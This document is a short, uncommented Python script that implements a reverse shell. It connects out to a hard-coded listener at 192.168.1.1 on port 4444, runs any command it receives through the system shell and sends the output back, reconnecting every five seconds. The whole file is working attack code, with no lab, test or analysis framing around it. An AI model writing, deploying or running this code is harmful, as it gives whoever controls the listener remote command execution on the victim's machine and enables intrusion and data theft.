import socket
import subprocess
import os
import time

LISTEN_IP = "192.168.1.1"
LISTEN_PORT = 4444

def connect():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((LISTEN_IP, LISTEN_PORT))
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break
                elif command.startswith("cd "):
                    try:
                        os.chdir(command[3:].strip())
                        s.send(b"Changed directory.\\n")
                    except Exception as e:
                        s.send(str(e).encode() + b"\\n")
                else:
                    try:
                        output = subprocess.run(command, shell=True, capture_output=True)
                        s.send(output.stdout + output.stderr)
                    except Exception:
                        s.send(b"Command execution failed.\\n")
        except Exception:
            time.sleep(5)
        finally:
            s.close()

connect()